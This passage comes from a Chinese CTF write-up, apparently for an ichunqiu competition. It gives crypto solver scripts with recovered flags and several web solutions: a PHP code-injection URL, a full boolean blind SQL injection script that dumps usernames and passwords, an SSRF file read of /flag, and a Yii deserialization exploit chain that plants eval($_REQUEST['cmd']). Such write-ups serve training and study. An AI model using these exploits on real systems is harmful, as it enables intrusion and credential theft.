v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    otp <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;QQQQQQ"</span><span class="token punctuation">,</span> <span class="token operator">*</span>rs<span class="token punctuation">)</span>    plain <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    otp <span class="token operator">=</span> otp<span class="token operator">*</span><span class="token number">2</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        plain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">^</span>otp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5"</span><span class="token punctuation">)</span>known_input <span class="token operator">=</span> <span class="token string">b"aaaaaaaaaaaaaaaaaaaaflag"</span>u <span class="token operator">=</span> get_u_from_out<span class="token punctuation">(</span>output<span class="token punctuation">,</span> known_input<span class="token punctuation">)</span>vs <span class="token operator">=</span> get_v_from_u<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token keyword">for</span> v <span class="token keyword">in</span> vs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>try_decode<span class="token punctuation">(</span>output<span class="token punctuation">,</span>u<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>在线运行sage代码</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510182858.png"></p><h2 id="3-密码学-primegame"><a href="#3-密码学-primegame" class="headerlink" title="3 密码学-primegame"></a>3 密码学-primegame</h2><pre class="language-python" data-language="python"><code class="language-python">exp<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token keyword">import</span> math<span class="token keyword">from</span> decimal <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token keyword">import</span> structgetcontext<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>prec <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> primes<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">*</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> f<span class="token punctuation">:</span>        primes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>primes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ln<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> v <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span>ct <span class="token operator">=</span> <span class="token number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>    h <span class="token operator">=</span> Decimal<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        h <span class="token operator">+=</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    ct <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ct<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    ln <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>    A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> ln <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> ln <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ln<span class="token punctuation">)</span><span class="token punctuation">:</span>        A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> ln<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> N        A<span class="token punctuation">[</span>ln<span class="token punctuation">,</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span>    A<span class="token punctuation">[</span>ln<span class="token punctuation">,</span> ln<span class="token punctuation">]</span> <span class="token operator">=</span> ct <span class="token operator">//</span> N    res <span class="token operator">=</span> A<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ln <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ln<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token operator">-</span><span class="token number">64</span> <span class="token operator">&lt;=</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            flag <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            vec <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>v <span class="token operator">+</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v <span class="token keyword">in</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            ret <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>vec<span class="token punctuation">)</span>            <span class="token keyword">if</span> ret <span class="token operator">==</span> ct<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>vec<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NO"</span><span class="token punctuation">,</span> ret<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>vec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    f<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510183036.png"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210510183057260.png"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> flag <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> flag<span class="token string">'flag&#123;715c39c3-1b46-4c23-\x00'</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> flag <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> flag<span class="token string">'8006-27b43eba2446&#125;\x00\x00\x00\x00\x00\x00\x00'</span>flag<span class="token punctuation">&#123;</span>715c39c3<span class="token operator">-</span>1b46<span class="token operator">-</span>4c23<span class="token operator">-</span><span class="token number">8006</span><span class="token operator">-</span>27b43eba2446<span class="token punctuation">&#125;</span></code></pre><h2 id="4-web-web-find-it"><a href="#4-web-web-find-it" class="headerlink" title="4 web-web find it"></a>4 web-web find it</h2><p>通过<code>code</code>直接写入<code>phpinfo()</code></p><p><code>http://eci-2zeg1tmyhxfbmpmn6585.cloudeci1.ichunqiu.com:80/?code=&lt;?php phpinfo();?&gt;</code></p><p>请求<code>hack.php</code> <code>find</code>搜索发现<code>flag</code></p><p><code>flag&#123;f21c9e0c-b8a0-4191-8e69-3580273b9e91&#125;</code></p><p>本想这道题需要写入shell完成命令执行，真没想到直接搜索，真是好题</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510183315.png"></p><h2 id="5-web-注入"><a href="#5-web-注入" class="headerlink" title="5 web-注入"></a>5 web-注入</h2><p>注入脚本bool.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">import</span> urllibs <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span>    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0'</span><span class="token punctuation">,</span>    <span class="token string">'Accept'</span><span class="token punctuation">:</span>    <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">getLength</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">judgeLength</span><span class="token punctuation">(</span>baseUrl<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> baseUrl <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> resLength<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">">"</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> i    <span class="token keyword">return</span> <span class="token string">"@"</span><span class="token keyword">def</span> <span class="token function">judgeString</span><span class="token punctuation">(</span>baseUrl<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> length<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            url <span class="token operator">=</span> baseUrl <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> resLength<span class="token punctuation">:</span>                result <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">">"</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">getDatabase</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"&amp;&amp;length(database())=%s"</span>    length <span class="token operator">=</span> judgeLength<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span>    payload2 <span class="token operator">=</span> <span class="token string">"&amp;&amp;ascii(substr(database(),%s,1))=%s"</span>    judgeString<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getTables</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"&amp;&amp;length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))=%s"</span>    length <span class="token operator">=</span> judgeLength<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span>    payload2 <span class="token operator">=</span> <span class="token string">"&amp;&amp;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),%s,1))=%s"</span>    judgeString<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getColumns</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"&amp;&amp;length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273))=%s"</span>    length <span class="token operator">=</span> judgeLength<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span>    payload2 <span class="token operator">=</span> <span class="token string">"&amp;&amp;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273),%s,1))=%s"</span>    judgeString<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getResult</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"&amp;&amp;length((select/**/group_concat(username,password)/**/from/**/users))=%s"</span>    length <span class="token operator">=</span> judgeLength<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> resLength<span class="token punctuation">)</span>    payload2 <span class="token operator">=</span> <span class="token string">"&amp;&amp;ascii(substr((select/**/group_concat(username,password)/**/from/**/users),%s,1))=%s"</span>    judgeString<span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> resLength<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://eci-2zefc95c45rh9xwew99q.cloudeci1.ichunqiu.com:80/image.php?id=1"</span>    length <span class="token operator">=</span> getLength<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment"># getUser(url, length)</span>    <span class="token comment"># getDatabase(url, length)</span>    <span class="token comment"># getTables(url, length) ## images,users</span>    <span class="token comment"># getColumns(url, length) ## username,password</span>    getResult<span class="token punctuation">(</span>url<span class="token punctuation">,</span> length<span class="token punctuation">)</span> <span class="token comment">## admin xxx可能会不一样de </span></code></pre><p>获取用户名密码</p><p>admin f7ba3a53d25a376074e36</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/28bd3ee632d3ec66a6014b0bb9a6385.png"></p><p>直接登录后台跳转至modify.php 该页面存在ssrf 直接读文件直接获取flag</p><p>file:///flag</p><p>file:///flag</p><p>TMD竞赛有非预期解  我不相信出题人故意干的 用御剑可以直接扫描出modify.php 且可以未授权访问 GG</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/3ca87d2fdf7ad822fb50ee2a3d1af21.png"></p><h2 id="6-web-framework"><a href="#6-web-framework" class="headerlink" title="6 web-framework"></a>6 web-framework</h2><p>御剑扫描去<a href="http://www.zip源码包审计发现是一个yii框架,/">www.zip源码包审计发现是一个yii框架，</a> 然后在网站找到YII的cve漏洞的playload（<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%AE%E6%94%B9playload%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%BC%96%E5%86%99exp%E4%BB%A3%E7%A0%81">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943），然后修改playload代码，编写exp代码</a></p><p>EXP</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>base</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">View</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'eval($_REQUEST["cmd"])'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"evaluateDynamicContent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 